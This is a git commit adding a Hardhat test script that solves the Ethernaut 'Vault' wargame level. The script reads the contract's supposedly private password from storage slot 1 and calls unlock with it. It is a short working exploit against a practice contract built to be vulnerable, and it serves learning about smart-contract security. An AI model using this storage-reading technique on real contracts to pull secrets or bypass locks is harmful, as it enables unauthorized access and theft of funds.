0a176e4f7148f695e13835abc6b9292c2e100044
Phill <20524533+ph0ph0@users.noreply.github.com>
2022-11-25 09:15:31 +0000

    solves 8-Vault

---
+++ test/8-force.js
@@ -0,0 +1,70 @@
+const { expect } = require("chai");
+const { Contract, Signer } = require("ethers");
+const { keccak256 } = require("ethers/lib/utils");
+const { ethers, waffle } = require("hardhat");
+const {
+  createChallenge,
+  submitLevel,
+  ETHERNAUT_ABI,
+  ETHERNAUT_ADDRESS,
+} = require("./utils");
+
+const abi = [
+  {
+    inputs: [
+      {
+        internalType: "bytes32",
+        name: "_password",
+        type: "bytes32",
+      },
+    ],
+    stateMutability: "nonpayable",
+    type: "constructor",
+  },
+  {
+    inputs: [],
+    name: "locked",
+    outputs: [
+      {
+        internalType: "bool",
+        name: "",
+        type: "bool",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "bytes32",
+        name: "_password",
+        type: "bytes32",
+      },
+    ],
+    name: "unlock",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+];
+
+const contractLevel = "0xF0751022c3765f9bCa97b88bF0986BFCAEbC5D9A";
+
+before(async () => {
+  [eoa] = await ethers.getSigners();
+  challengeAddress = await createChallenge(contractLevel, 0, "VaultFactory");
+  //   const artifact = await artifacts.readArtifact("Fal1out");
+  challenge = new ethers.Contract(challengeAddress, abi, eoa);
+  console.log(`eoa address: ${JSON.stringify(eoa.address)}`);
+});
+
+it("solves the challenge", async () => {
+  let password = await ethers.provider.getStorageAt(challenge.address, 1);
+  const tx = await challenge.unlock(password);
+  await tx.wait(1);
+});
+
+after(async () => {
+  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
+});
